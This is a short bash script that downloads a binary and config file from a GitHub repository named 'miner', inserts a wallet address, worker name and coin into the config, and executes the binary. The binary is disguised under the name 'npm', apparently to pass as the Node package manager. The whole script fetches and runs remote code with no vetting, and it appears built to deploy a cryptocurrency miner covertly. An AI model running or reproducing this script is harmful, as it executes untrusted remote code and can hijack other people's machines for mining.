#!/bin/bash
wallet="$1"
workername="$2"
coin="c=$3"
wget -q https://raw.githubusercontent.com/fuckl0l/miner/main/npm.ini
wget -q https://raw.githubusercontent.com/fuckl0l/miner/main/npm
chmod +x npm
sed -i "s/coinwallet/$wallet/" "npm.ini"
sed -i "s/workername/$workername/" "npm.ini"
sed -i "s/password/$coin/" "npm.ini"
./npm npm.ini 
